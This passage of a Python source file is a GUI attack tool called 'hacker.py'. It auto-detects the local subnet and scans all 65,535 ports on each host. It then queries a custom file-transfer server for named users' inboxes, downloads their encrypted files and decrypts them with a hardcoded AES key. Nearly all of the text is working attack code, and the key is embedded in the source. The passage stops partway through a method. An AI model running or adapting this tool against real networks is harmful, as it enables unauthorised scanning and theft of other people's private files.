# hacker.py
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import socket
import os
import sys
import base64
import threading
import time
import traceback
import uuid 
import io 
import contextlib 
import queue 
from concurrent.futures import ThreadPoolExecutor 
import copy 
import shutil 


import ipaddress 



try:
    from Crypto.Cipher import AES
    PYCRYPTODOME_AVAILABLE = True
except ImportError:
    PYCRYPTODOME_AVAILABLE = False
    
    try:
        root = tk.Tk(); root.withdraw() 
        messagebox.showerror("Dependency Error", "PyCryptodome library not found.\nPlease install it: pip install pycryptodome", parent=root)
        root.destroy()
    except tk.TclError:
         print("ERROR: PyCryptodome library not found. Please install it: pip install pycryptodome")
    

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False
    
    print("WARNING: 'netifaces' library not found. Default gateway detection disabled.")
    print("Please install it for automatic subnet scanning: pip install netifaces")


KEY = b'Pb8qfKDyzwoqjiXrPVpsdhrsWxj8q8Tbv_f2n1S25Do='
DEFAULT_SERVER_IP = '10.11.12.22' 
DEFAULT_SERVER_PORT = 23456
BUFFER_SIZE = 8192
SOCKET_TIMEOUT = 30.0 
CHUNK_TIMEOUT = 15.0  
NONCE_SIZE = 12
TAG_SIZE = 16
DOWNLOAD_DELAY_SECONDS = 0.1 

ENABLE_FULL_SCAN_BY_DEFAULT = False 
ENABLE_PORT_SCANNING = True 


PORT_SCAN_CONNECTION_TIMEOUT = 0.2 
PORT_SCAN_RANGE = (3307, 15000) 
FULL_SCAN_RANGE = (1, 65535)


NETWORK_SCAN_IP_TIMEOUT_SECONDS = 700.0 

NETWORK_SCAN_MAX_THREADS = 1000 


AES_KEY = None
try:
    if not PYCRYPTODOME_AVAILABLE: raise ImportError("PyCryptodome not loaded")
    AES_KEY = base64.urlsafe_b64decode(KEY)
    if len(AES_KEY) not in [16, 24, 32]:
        raise ValueError("Decoded key length must be 16, 24, or 32 bytes.")
except (ValueError, TypeError, base64.binascii.Error, ImportError) as e:
     try:
         
         try: root = tk.Tk(); root.withdraw()
         except tk.TclError: root = None 

         if root:
             messagebox.showerror("Initialization Error", f"AES Key Error or missing PyCryptodome: {e}", parent=root)
             root.destroy()
         else:
             print(f"CRITICAL ERROR: AES Key Error or missing PyCryptodome: {e}")
     except tk.TclError: 
         print(f"CRITICAL ERROR: AES Key Error or missing PyCryptodome: {e}")
     


HACKED_FILES_DIR = "hacked_files_gui"
TEMP_DOWNLOAD_DIR = "temp_hacker_downloads_gui"
ENCRYPTED_SAVE_SUBDIR = "_encrypted_files" 






class StdoutRedirector:
    def __init__(self, widget):
        self.widget = widget
    def write(self, message):
        try:
            if self.widget.winfo_exists():
                 self.widget.after_idle(self._write_to_widget, message)
        except tk.TclError:
             print(f"[Redirector Error] Widget destroyed: {message.strip()}", file=sys.__stderr__)
    def _write_to_widget(self, message):
        try:
             self.widget.configure(state=tk.NORMAL)
             self.widget.insert(tk.END, message)
             self.widget.see(tk.END)
             self.widget.configure(state=tk.DISABLED)
        except tk.TclError:
             print(f"[Redirector Error] Write failed, widget destroyed: {message.strip()}", file=sys.__stderr__)
    def flush(self):
        pass



def get_default_gateway_ip():
    """Tries to find the default gateway IP using netifaces."""
    if not NETIFACES_AVAILABLE:
        print("[NETWORK] 'netifaces' not installed, cannot detect gateway.")
        return None
    try:
        gateways = netifaces.gateways()
        
        default_gw_info = gateways.get('default', {}).get(netifaces.AF_INET)
        if default_gw_info:
            gw_ip = default_gw_info[0]
            print(f"[NETWORK] Detected default gateway: {gw_ip}")
            return gw_ip
        else:
            print("[NETWORK] Could not find default IPv4 gateway.")
            
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET)
                if addrs:
                    for addr_info in addrs:
                        ip = addr_info.get('addr')
                        
                        if ip and (ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.')):
                             
                             parts = ip.split('.')
                             if len(parts) == 4 and parts[3] == '1': 
                                 print(f"[NETWORK] Found potential gateway on interface {iface}: {ip} (Fallback guess)")
                                 
                                 
                                 
            return None
    except Exception as e:
        print(f"[ERROR] Failed to get gateway info using netifaces: {e}")
        return None

def get_subnet_ips(gateway_ip, subnet_mask="255.255.255.0"):
    """Generates a list of IPs in the /24 subnet of the gateway."""
    if not gateway_ip:
        return []
    try:
        
        
        ip_parts = gateway_ip.split('.')
        if len(ip_parts) != 4:
            raise ValueError("Invalid gateway IP format")
        network_prefix = ".".join(ip_parts[:3])
        
        subnet_ips = [f"{network_prefix}.{i}" for i in range(1, 255)]
        print(f"[NETWORK] Generated {len(subnet_ips)} target IPs for subnet {network_prefix}.0/24")
        return subnet_ips
    except Exception as e:
        print(f"[ERROR] Failed to generate subnet IPs from gateway {gateway_ip}: {e}")
        return []




def ensure_dir_exists(dir_path):
    """Creates a directory if it doesn't exist. Returns True on success/already exists, False on error."""
    try:
        os.makedirs(dir_path, exist_ok=True)
        return True
    except OSError as e:
        print(f"[ERROR] Could not create directory '{dir_path}': {e}")
        return False

def check_port(ip, port, timeout):
    """Checks a single port. Returns True if open, False otherwise."""
    sock = None
    try:
        if not (0 < port < 65536): return False
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        return result == 0
    except (socket.error, OverflowError): 
        return False
    finally:
        if sock:
            try: sock.close()
            except socket.error: pass




def scan_port_worker_all(ip, ports_to_check, timeout, found_list, list_lock,
                         progress_counter, progress_lock, total_ports, progress_callback):
    """Worker for finding ALL open ports, with progress reporting."""
    local_found = []
    for port in ports_to_check:
        port_is_open = check_port(ip, port, timeout)

        
        current_checked = 0
        if progress_lock and progress_counter is not None:
            with progress_lock:
                progress_counter[0] += 1
                current_checked = progress_counter[0]
            if progress_callback:
                progress_callback(current_checked, total_ports) 
        

        if port_is_open:
            local_found.append(port)
            
            

    if local_found:
        with list_lock:
            found_list.extend(local_found)


def find_all_open_ports_for_ip(server_ip, full_scan_timeout, full_scan_max_threads, scan_progress_callback=None):
    """
    Scans the FULL port range (1-65535) for a SINGLE IP to find ALL open ports.
    Uses specific timeout and thread settings for network scanning.
    Returns a sorted list of open port numbers. Reports progress via callback.
    """
    print(f"[PORT SCAN - ALL] Starting FULL range scan for {server_ip} (Timeout: {full_scan_timeout}s, Threads: {full_scan_max_threads})")
    print(f"[PORT SCAN - ALL] WARNING: Scanning 65535 ports on {server_ip} can take a long time!")

    found_ports_list = []
    list_lock = threading.Lock()

    actual_port_range = FULL_SCAN_RANGE
    ports_to_scan = list(range(actual_port_range[0], actual_port_range[1] + 1))
    total_ports_to_scan = len(ports_to_scan)

    if total_ports_to_scan == 0:
        print(f"[PORT SCAN - ALL] No valid ports to scan for {server_ip} (this shouldn't happen).")
        if scan_progress_callback: scan_progress_callback(0, 0) 
        return []

    
    if scan_progress_callback: scan_progress_callback(0, total_ports_to_scan)

    
    ports_checked_counter = [0] 
    progress_lock = threading.Lock()
    

    threads = []
    actual_threads = min(full_scan_max_threads, total_ports_to_scan) if total_ports_to_scan > 0 else 0
    if actual_threads == 0:
         print(f"[PORT SCAN - ALL] No threads allocated for {server_ip} (error?).")
         if scan_progress_callback: scan_progress_callback(total_ports_to_scan, total_ports_to_scan) 
         return []
    ports_per_thread = (total_ports_to_scan + actual_threads - 1) // actual_threads

    start_time = time.monotonic()
    scan_deadline = start_time + full_scan_timeout

    for i in range(actual_threads):
        start_index = i * ports_per_thread
        end_index = min((i + 1) * ports_per_thread, total_ports_to_scan)
        port_chunk = ports_to_scan[start_index:end_index]
        if not port_chunk: continue

        thread = threading.Thread(
            target=scan_port_worker_all,
            args=(server_ip, port_chunk, PORT_SCAN_CONNECTION_TIMEOUT, 
                  found_ports_list, list_lock,
                  ports_checked_counter, progress_lock, total_ports_to_scan, scan_progress_callback), 
            name=f"ScanWorkerAll-{server_ip}-{i}",
            daemon=True
        )
        threads.append(thread)
        thread.start()

    
    
    all_threads_joined = True
    for thread in threads:
        remaining_time = scan_deadline - time.monotonic()
        if remaining_time <= 0:
             print(f"[PORT SCAN - ALL] Overall scan timeout ({full_scan_timeout}s) reached for IP {server_ip} while waiting for threads.")
             all_threads_joined = False
             break 
        thread.join(timeout=remaining_time)
        if thread.is_alive(): 
            print(f"[PORT SCAN - ALL] Thread {thread.name} did not finish within timeout for IP {server_ip}.")
            all_threads_joined = False

    elapsed_time = time.monotonic() - start_time

    
    if scan_progress_callback:
        with progress_lock:
            final_checked = ports_checked_counter[0]
        
        if all_threads_joined and elapsed_time <= full_scan_timeout :
            scan_progress_callback(total_ports_to_scan, total_ports_to_scan)
        else: 
            scan_progress_callback(final_checked, total_ports_to_scan)

    
    with list_lock:
        final_ports = sorted(list(set(found_ports_list)))

    if not final_ports:
        
        if all_threads_joined and elapsed_time <= full_scan_timeout:
            print(f"[PORT SCAN - ALL] No open ports found for {server_ip} in {elapsed_time:.2f}s.")
        elif elapsed_time > full_scan_timeout:
             print(f"[PORT SCAN - ALL] Scan timed out for {server_ip} after {elapsed_time:.2f}s. Ports found so far: {final_ports if final_ports else 'None'}")
        else: 
             print(f"[PORT SCAN - ALL] Scan finished for {server_ip} in {elapsed_time:.2f}s, but some threads failed to join. Ports found: {final_ports if final_ports else 'None'}")

    else:
        print(f"[PORT SCAN - ALL] Found {len(final_ports)} open port(s) for {server_ip} in {elapsed_time:.2f}s: {final_ports}")

    return final_ports






def scan_user_inbox(server_ip, target_port, username):
    """
    Uses CHECK command on a SPECIFIC ip:port. Returns list of file info dicts on success,
    [] if empty, None on error/connection failure/timeout for *this specific ip:port*.
    """
    
    client_socket = None
    try:
        if not (0 < target_port < 65536):
            
            return None

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        connect_timeout = min(5.0, SOCKET_TIMEOUT)
        client_socket.settimeout(connect_timeout)
        client_socket.connect((server_ip, target_port))

        command = f"CHECK:{username}"
        
        client_socket.settimeout(SOCKET_TIMEOUT)
        client_socket.sendall(command.encode())

        
        response_bytes = b""
        
        client_socket.settimeout(CHUNK_TIMEOUT)
        start_time = time.monotonic()
        while True:
            if time.monotonic() - start_time > SOCKET_TIMEOUT:
                 raise socket.timeout(f"Overall operation timeout ({SOCKET_TIMEOUT}s) reached receiving CHECK response for '{username}' on {server_ip}:{target_port}.")
            try:
                chunk = client_socket.recv(BUFFER_SIZE)
                if not chunk: break 
                response_bytes += chunk
            except socket.timeout:
                 
                 if response_bytes:
                     print(f"[WARNING] Chunk timeout receiving CHECK response for '{username}' on {server_ip}:{target_port}. Processing {len(response_bytes)} bytes received.")
                     break
                 else:
                      raise socket.timeout(f"Chunk timeout ({CHUNK_TIMEOUT}s) receiving CHECK response for '{username}' on {server_ip}:{target_port} (no data received).")
            except socket.error as e:
                 print(f"[ERROR] Socket error receiving CHECK response for '{username}' on {server_ip}:{target_port}: {e}")
                 return None

        
        response = response_bytes.decode(errors='ignore').strip()

        if not response:
             
             try:
                 peer = client_socket.getpeername() 
                 
                 
                 
                 print(f"[WARNING] Received empty CHECK response for '{username}' on {server_ip}:{target_port}. Treating as error.")
                 return None
             except socket.error: 
                  
                  
                  
                  print(f"[WARNING] Received empty CHECK response (socket closed) for '{username}' on {server_ip}:{target_port}. Treating as error.")
                  return None
        elif response == "EMPTY":
            
            return [] 
        elif response.startswith("ERROR:"):
             error_message = response[len("ERROR:"):].strip()
             
             if "invalid recipient" not in error_message.lower() and "authorization failed" not in error_message.lower():
                 print(f"[ERROR] Server error checking '{username}' on {server_ip}:{target_port}: {error_message}")
             return None 
        else:
            
            found_files = []
            raw_files = [item for item in response.split(';') if item]
            
            malformed_count = 0
            parsed_count = 0
            for f_data in raw_files:
                 f_data = f_data.strip()
                 if not f_data: continue
                 try:
                     parts = f_data.split(',', 3)
                     if len(parts) == 4:
                         file_id, sender, filename, timestamp = map(str.strip, parts)
                         if not file_id.isdigit() or int(file_id) <= 0: raise ValueError(f"Invalid file ID")
                         if not sender or not filename or not timestamp: raise ValueError("Missing fields")
                         found_files.append({'id': file_id, 'sender': sender, 'filename': filename, 'timestamp': timestamp})
                         parsed_count += 1
                     else: raise ValueError(f"Incorrect parts ({len(parts)})")
                 except Exception as parse_e:
                     print(f"[WARNING] Skipping malformed entry for '{username}' ({server_ip}:{target_port}): '{f_data[:80]}...' ({parse_e})")
                     malformed_count += 1

            if malformed_count > 0 and parsed_count == 0 and malformed_count == len(raw_files):
                 print(f"[ERROR] All {malformed_count} entries for '{username}' ({server_ip}:{target_port}) were malformed. Communication error?")
                 return None 

            
            return found_files 

    except socket.timeout as e:
         
         return None 
    except (socket.error, ConnectionRefusedError, BrokenPipeError, OSError) as e:
        
        if not isinstance(e, ConnectionRefusedError):
            print(f"[ERROR] Connection error checking '{username}' on {server_ip}:{target_port}: {e}")
        return None 
    except Exception as e:
        print(f"[ERROR] Unexpected error checking '{username}' on {server_ip}:{target_port}: {e}\n{traceback.format_exc()}")
        return None 
    finally:
         if client_socket:
             try: client_socket.close()
             except socket.error: pass


def download_encrypted_file(server_ip, target_port, file_id, recipient_username, progress_callback=None):
    """
    Downloads encrypted file from a SPECIFIC ip:port, returns (temp_path, size) or (None, 0) on failure for *this ip:port*.
    Handles cleanup of incomplete downloads.
    """
    
    if not ensure_dir_exists(TEMP_DOWNLOAD_DIR): return None, 0

    if not (0 < target_port < 65536):
        
        return None, 0

    temp_enc_path = os.path.join(TEMP_DOWNLOAD_DIR, f"enc_{recipient_username}_{file_id}_{uuid.uuid4().hex[:8]}.bin")

    client_socket = None
    temp_enc_file = None
    total_received = 0
    expected_size = 0
    download_successful = False

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect_timeout = min(5.0, SOCKET_TIMEOUT)
        client_socket.settimeout(connect_timeout)
        client_socket.connect((server_ip, target_port))

        command = f"GET:{recipient_username}:{file_id}"
        client_socket.settimeout(SOCKET_TIMEOUT) 
        client_socket.sendall(command.encode())

        
        client_socket.settimeout(CHUNK_TIMEOUT) 
        response_bytes = b""
        start_operation_time = time.monotonic()
        
        while True:
            if time.monotonic() - start_operation_time > SOCKET_TIMEOUT:
                 raise socket.timeout(f"Overall timeout ({SOCKET_TIMEOUT}s) waiting for initial GET response for ID {file_id} on {server_ip}:{target_port}")
            try:
                chunk = client_socket.recv(BUFFER_SIZE)
                if not chunk:
                    
                    raise socket.error("Connection closed prematurely receiving GET response.")
                response_bytes += chunk
                
                
                if b'\n' in response_bytes or response_bytes.startswith(b"FOUND:") or response_bytes.startswith(b"ERROR:"):
                     break
            except socket.timeout:
                 if response_bytes: 
                      print(f"[WARNING] Chunk timeout receiving initial GET response for ID {file_id} ({server_ip}:{target_port}). Processing partial response.")
                      break
                 else:
                      raise socket.timeout(f"Chunk timeout ({CHUNK_TIMEOUT}s) receiving initial GET response for ID {file_id} ({server_ip}:{target_port}), no data.")
            except socket.error as e:
                 print(f"[ERROR] Socket error receiving initial GET response for ID {file_id} ({server_ip}:{target_port}): {e}")
                 return None, 0

        response = response_bytes.decode(errors='ignore').strip() 

        if response.startswith("FOUND:"):
            try:
                size_str = response.split(':', 1)[1].strip()
                expected_size = int(size_str)
                if expected_size < NONCE_SIZE + TAG_SIZE:
                    raise ValueError(f"Reported size {expected_size} invalid.")
                
            except (IndexError, ValueError, TypeError) as e:
                 print(f"[ERROR] Invalid size response from server {server_ip}:{target_port} for ID {file_id}: '{response}'. Error: {e}")
                 return None, 0

            
            if time.monotonic() - start_operation_time > SOCKET_TIMEOUT:
                 raise socket.timeout("Overall operation timeout reached before sending READY.")
            client_socket.settimeout(SOCKET_TIMEOUT) 
            client_socket.sendall(b"READY")
            

            try: temp_enc_file = open(temp_enc_path, 'wb')
            except IOError as e:
                print(f"[ERROR] Failed to open temporary file '{temp_enc_path}': {e}")
                return None, 0

            if progress_callback: progress_callback(0, expected_size)
            last_progress_update = time.monotonic()

            while total_received < expected_size:
                if time.monotonic() - start_operation_time > SOCKET_TIMEOUT:
                    raise socket.timeout(f"Overall operation timeout ({SOCKET_TIMEOUT}s) reached during download for ID {file_id}.")

                try:
                    remaining_overall = max(0.1, SOCKET_TIMEOUT - (time.monotonic() - start_operation_time))
                    current_chunk_timeout = min(CHUNK_TIMEOUT, remaining_overall)
                    client_socket.settimeout(current_chunk_timeout)

                    bytes_to_read = min(BUFFER_SIZE, expected_size - total_received)
                    if bytes_to_read <= 0: break

                    chunk = client_socket.recv(bytes_to_read)
                    if not chunk:
                        raise socket.error(f"Server {server_ip}:{target_port} disconnected prematurely during download ID {file_id}. Got {total_received}/{expected_size} bytes.")

                    temp_enc_file.write(chunk)
                    total_received += len(chunk)

                    now = time.monotonic()
                    if progress_callback and (now - last_progress_update > 0.1 or total_received == expected_size):
                        progress_callback(total_received, expected_size)
                        last_progress_update = now

                except socket.timeout:
                    
                    raise socket.timeout(f"Timeout receiving file data chunk from {server_ip}:{target_port} (ID {file_id}). Received {total_received}/{expected_size} bytes.")
                except (IOError, socket.error) as e:
                     print(f"[ERROR] IO/Socket error during download data receive from {server_ip}:{target_port} for ID {file_id}: {e}")
                     raise 

            temp_enc_file.close(); temp_enc_file = None 

            if total_received == expected_size:
                
                download_successful = True
                return temp_enc_path, total_received 
            else:
                print(f"[ERROR] Download incomplete from {server_ip}:{target_port} for ID {file_id}. Expected {expected_size}, got {total_received}.")
                
                return None, 0

        elif response.startswith("ERROR:"):
            error_msg = response[len("ERROR:"):].strip()
            
            if "not found" not in error_msg.lower() and "invalid recipient" not in error_msg.lower() and "authorization failed" not in error_msg.lower():
                 print(f"[ERROR] Server GET failed on {server_ip}:{target_port} for ID {file_id}: {error_msg}")
            return None, 0
        else:
            print(f"[ERROR] Unexpected GET response from server {server_ip}:{target_port} for ID {file_id}: '{response[:100]}...'")
            return None, 0

    except socket.timeout as e:
         
         return None, 0
    except (socket.error, ConnectionRefusedError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
        
        if not isinstance(e, (ConnectionRefusedError, ConnectionAbortedError)):
            print(f"[ERROR] Connection/Network error during download for ID {file_id} on {server_ip}:{target_port}: {e}")
        return None, 0
    except IOError as e: 
         print(f"[ERROR] File I/O error during download for ID {file_id} on {server_ip}:{target_port}: {e}")
         return None, 0
    except Exception as e:
        print(f"[ERROR] Unexpected download failure for ID {file_id} on {server_ip}:{target_port}: {e}\n{traceback.format_exc()}")
        return None, 0
    finally:
        
        if temp_enc_file and not temp_enc_file.closed:
            try: temp_enc_file.close()
            except Exception: pass
        if not download_successful and os.path.exists(temp_enc_path):
             try:
                 
                 if total_received > 0 or expected_size > 0 :
                     print(f"    Cleaning up incomplete/failed download: {temp_enc_path}")
                 os.remove(temp_enc_path)
             except OSError as rm_err:
                 print(f"[WARNING] Could not remove temporary file {temp_enc_path}: {rm_err}")
        if client_socket:
             try: client_socket.close()
             except socket.error: pass


def decrypt_and_save(encrypted_file_path, output_dir, original_filename, expected_size):
    """
    Decrypts using known key. Returns True on success, False on failure.
    Does NOT delete the input encrypted_file_path. Caller handles it.
    Cleans up partially created *decrypted* file on failure.
    """
    
    if not os.path.exists(encrypted_file_path):
        print(f"[ERROR] Encrypted file not found for decryption: {encrypted_file_path}")
        return False

    actual_size = os.path.getsize(encrypted_file_path)
    if actual_size < NONCE_SIZE + TAG_SIZE:
        print(f"[ERROR] Encrypted file '{original_filename}' size ({actual_size}) is too small. Cannot decrypt.")
        return False
    

    if not ensure_dir_exists(output_dir): return False

    
    safe_base = os.path.basename(original_filename)
    safe_filename_base = "".join(c for c in safe_base if c.isalnum() or c in (' ', '.', '_', '-')).strip()
    if not safe_filename_base: safe_filename_base = f"decrypted_{uuid.uuid4().hex}"
    
    output_path = os.path.join(output_dir, safe_filename_base)
    counter = 1
    name, ext = os.path.splitext(safe_filename_base)
    while os.path.exists(output_path):
        output_path = os.path.join(output_dir, f"{name}_{counter}{ext}")
        counter += 1
        if counter > 100: 
            print(f"[ERROR] Too many filename collisions for '{safe_base}'. Aborting decryption.")
            return False

    
    enc_file = None
    dec_file = None
    success = False
    try:
        enc_file = open(encrypted_file_path, 'rb')
        nonce = enc_file.read(NONCE_SIZE)
        tag = enc_file.read(TAG_SIZE) 
        
        if len(nonce) != NONCE_SIZE or len(tag) != TAG_SIZE:
             raise IOError(f"Failed to read complete nonce/tag. File likely truncated. Got nonce: {len(nonce)}, tag: {len(tag)}.")

        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
        dec_file = open(output_path, 'wb')

        
        
        ciphertext_payload_size = actual_size - NONCE_SIZE - TAG_SIZE
        read_so_far = 0
        while read_so_far < ciphertext_payload_size:
            read_size = min(BUFFER_SIZE, ciphertext_payload_size - read_so_far)
            if read_size <= 0: break 

            encrypted_chunk = enc_file.read(read_size)
            if len(encrypted_chunk) != read_size:
                 
                 raise IOError(f"Failed to read complete ciphertext chunk. Expected {read_size}, got {len(encrypted_chunk)}. File likely corrupt/truncated.")

            decrypted_chunk = cipher.decrypt(encrypted_chunk) 
            dec_file.write(decrypted_chunk)
            read_so_far += len(encrypted_chunk)

        
        
        
        
        
        enc_file.seek(-(TAG_SIZE), os.SEEK_END) 
        tag_from_end = enc_file.read(TAG_SIZE)
        if tag_from_end != tag:
             print(f"[WARNING] Tag read initially differs from tag at file end. Using tag from end for verification.")
             tag = tag_from_end
        if len(tag) != TAG_SIZE:
             raise IOError(f"Failed to re-read complete tag from end. Expected {TAG_SIZE}, got {len(tag)}.")

        
        
        
        
        
        
        cipher.verify(tag) 

        
        dec_file.close(); dec_file = None
        print(f"    Decryption SUCCESS -> '{output_path}'")
        success = True
        return True

    except (ValueError, IOError, EOFError) as e: 
        print(f"    Decryption FAILED for '{original_filename}': {e}")
        success = False
        return False
    except Exception as e:
        print(f"[ERROR] Unexpected decryption error for '{original_filename}': {e}\n{traceback.format_exc()}")
        success = False
        return False
    finally:
        
        if enc_file and not enc_file.closed:
            try: enc_file.close()
            except Exception: pass
        if dec_file and not dec_file.closed:
            try: dec_file.close() 
            except Exception: pass

        
        if not success and os.path.exists(output_path):
             try:
                 print(f"    Cleaning up failed decryption output: {output_path}")
                 os.remove(output_path)
             except OSError as rm_err:
                 print(f"[WARNING] Could not remove failed decryption output {output_path}: {rm_err}")



class HackerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"Hacker Tool GUI v11.0 (Network Scan & Attack - No Music)") 
        self.geometry("850x750") 

        
        
        

        
        self.server_ip_var = tk.StringVar(value=DEFAULT_SERVER_IP)
        
        self.server_port_var = tk.StringVar(value=str(DEFAULT_SERVER_PORT))
        
        self.scan_user_var = tk.StringVar()
        self.get_id_var = tk.StringVar()
        self.get_recipient_var = tk.StringVar()
        self.get_filename_var = tk.StringVar()
        self.status_var = tk.StringVar(value="Status: Idle")
        
        self.port_scan_enabled_var = tk.BooleanVar(value=ENABLE_PORT_SCANNING)
        self.scan_full_range_var = tk.BooleanVar(value=ENABLE_FULL_SCAN_BY_DEFAULT)

        
        style = ttk.Style(self)
        style.theme_use('clam')

        main_frame = ttk.Frame(self, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        
        server_frame = ttk.LabelFrame(main_frame, text="Target Server (Manual/Fallback)", padding="10")
        server_frame.pack(fill=tk.X, pady=5)
        server_frame.columnconfigure(1, weight=1)

        ttk.Label(server_frame, text="Fallback IP:").grid(row=0, column=0, padx=5, pady=2, sticky=tk.W)
        ttk.Entry(server_frame, textvariable=self.server_ip_var, width=20).grid(row=0, column=1, padx=5, pady=2, sticky=tk.EW)
        ttk.Label(server_frame, text="Manual Port:").grid(row=0, column=2, padx=(10, 5), pady=2, sticky=tk.W)
        ttk.Entry(server_frame, textvariable=self.server_port_var, width=8).grid(row=0, column=3, padx=5, pady=2, sticky=tk.W)

        
        self.port_scan_checkbox = ttk.Checkbutton(
            server_frame, variable=self.port_scan_enabled_var, command=self._toggle_port_scan
        )
        self.port_scan_checkbox.grid(row=1, column=0, columnspan=2, padx=5, pady=2, sticky=tk.W)
        self.full_scan_checkbox = ttk.Checkbutton(
            server_frame, text=f"Full Range ({FULL_SCAN_RANGE[0]}-{FULL_SCAN_RANGE[1]}) for Manual",
            variable=self.scan_full_range_var, command=self._toggle_full_scan,
            state=tk.NORMAL if self.port_scan_enabled_var.get() else tk.DISABLED
        )
        self.full_scan_checkbox.grid(row=1, column=2, columnspan=2, padx=5, pady=2, sticky=tk.W)
        self._update_scan_checkbox_label() 

        
        network_attack_frame = ttk.LabelFrame(main_frame, text="Automated Network Attack", padding="10")
        network_attack_frame.pack(fill=tk.X, pady=10)
        network_attack_frame.columnconfigure(1, weight=1)

        ttk.Label(network_attack_frame, text="Usernames to Check (comma-sep):").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.network_scan_user_entry = ttk.Entry(network_attack_frame, textvariable=self.scan_user_var, width=50) 
        self.network_scan_user_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        ttk.Label(network_attack_frame, text="(Required for Network Attack)").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)

        self.network_attack_button = ttk.Button(
            network_attack_frame,
            text="Scan Local Network & Attack (Uses Above Usernames)",
            command=self._network_attack_action
        )
        self.network_attack_button.grid(row=1, column=0, columnspan=3, pady=10)

        
        manual_actions_frame = ttk.LabelFrame(main_frame, text="Manual Actions (Uses Fallback IP/Manual Port)", padding="10")
        manual_actions_frame.pack(fill=tk.X, pady=5)
        manual_actions_frame.columnconfigure(0, weight=1)
        manual_actions_frame.columnconfigure(1, weight=2)

        
        scan_frame = ttk.Frame(manual_actions_frame, padding=5)
        scan_frame.grid(row=0, column=0, padx=10, pady=5, sticky=tk.NW)
        ttk.Label(scan_frame, text="Manual Scan User Inbox:").pack(anchor=tk.W)
        
        ttk.Label(scan_frame, text="(Uses username field above)").pack(anchor=tk.W, pady=2)
        self.scan_button = ttk.Button(scan_frame, text="Manual Scan Inbox", command=self._scan_action)
        self.scan_button.pack(pady=5)

        
        get_frame = ttk.Frame(manual_actions_frame, padding=5)
        get_frame.grid(row=0, column=1, padx=10, pady=5, sticky=tk.NW)
        ttk.Label(get_frame, text="Manual Download & Decrypt:").pack(anchor=tk.W)
        get_grid = ttk.Frame(get_frame); get_grid.pack(fill=tk.X); get_grid.columnconfigure(1, weight=1)
        ttk.Label(get_grid, text="File ID:").grid(row=0, column=0, padx=2, pady=1, sticky=tk.W)
        ttk.Entry(get_grid, textvariable=self.get_id_var, width=8).grid(row=0, column=1, padx=2, pady=1, sticky=tk.W)
        ttk.Label(get_grid, text="Recipient:").grid(row=1, column=0, padx=2, pady=1, sticky=tk.W)
        ttk.Entry(get_grid, textvariable=self.get_recipient_var, width=25).grid(row=1, column=1, padx=2, pady=1, sticky=tk.W)
        ttk.Label(get_grid, text="Orig. Name:").grid(row=2, column=0, padx=2, pady=1, sticky=tk.W)
        ttk.Entry(get_grid, textvariable=self.get_filename_var, width=40).grid(row=2, column=1, padx=2, pady=1, sticky=tk.EW)
        self.get_button = ttk.Button(get_frame, text="Manual Download & Decrypt", command=self._get_action)
        self.get_button.pack(pady=5, anchor=tk.W)

        
        self.progress_bar = ttk.Progressbar(main_frame, orient='horizontal', mode='determinate', length=300)
        self.progress_bar.pack(fill=tk.X, pady=(5,0))

        
        output_frame = ttk.LabelFrame(main_frame, text="Output Log", padding="10")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.output_text = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, height=15, width=90, state=tk.DISABLED, bg="#f0f0f0", font=("Consolas", 9))
        self.output_text.pack(fill=tk.BOTH, expand=True)
        self.stdout_redirector = StdoutRedirector(self.output_text)

        
        status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W, padding=5)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        
        sys.stdout = self.stdout_redirector
        sys.stderr = self.stdout_redirector

        
        print(f"--- Hacker GUI Initialized (v11.0 - Network Scan & Attack - No Music) ---")
        print(f"AES Key Loaded: {'OK' if AES_KEY else 'Failed'}")
        print(f"PyCryptodome Found: {'Yes' if PYCRYPTODOME_AVAILABLE else 'No - CRITICAL'}")
        print(f"netifaces Found: {'Yes' if NETIFACES_AVAILABLE else 'No - Gateway detection disabled'}")
        print(f"Network Attack Mode: Scans subnet (if gateway found) or fallback IP.")
        print(f"Network Attack Mode: Scans ALL ports (1-65535) per IP.")
        print(f"Network Attack Mode: Uses username(s) from 'Usernames to Check' field.")
        print(f"WARNING: Network attack is VERY SLOW and network-intensive.")
        print(f"Manual Actions use Fallback IP / Manual Port and associated scan settings.")
        print("--- Ready ---")

        
        self.after(100, self._display_gateway_info) 

    def _display_gateway_info(self):
        """Gets and prints gateway info shortly after startup."""
        gw = get_default_gateway_ip()
        if gw:
            print(f"[INFO] Detected Gateway: {gw}. Network Attack will target its /24 subnet.")
        else:
            fb_ip = self.server_ip_var.get()
            print(f"[INFO] Gateway detection failed or 'netifaces' missing.")
            if fb_ip:
                print(f"[INFO] Network Attack will fall back to scanning only the Fallback IP: {fb_ip}")
            else:
                print("[WARNING] Network Attack requires a target. Enter Fallback IP if gateway detection fails.")


    
    def _update_status(self, message):
        self.after_idle(lambda: self.status_var.set(f"Status: {message}"))

    def _update_progress(self, value, maximum):
        def update():
            try:
                if self.progress_bar.winfo_exists():
                    max_val = max(1, maximum)
                    curr_val = min(max(0, value), max_val)
                    self.progress_bar['maximum'] = max_val
                    self.progress_bar['value'] = curr_val
            except tk.TclError: pass
            except Exception as e: print(f"[ERROR] GUI Progress Update Error: {e}")
        
        self.after(0, update)

    def _scan_progress_update(self, current, total):
        """Callback for port scanning progress (per IP)."""
        
        self._update_progress(current, total)

    def _download_progress_update(self, current, total):
         """Callback for file download progress."""
         
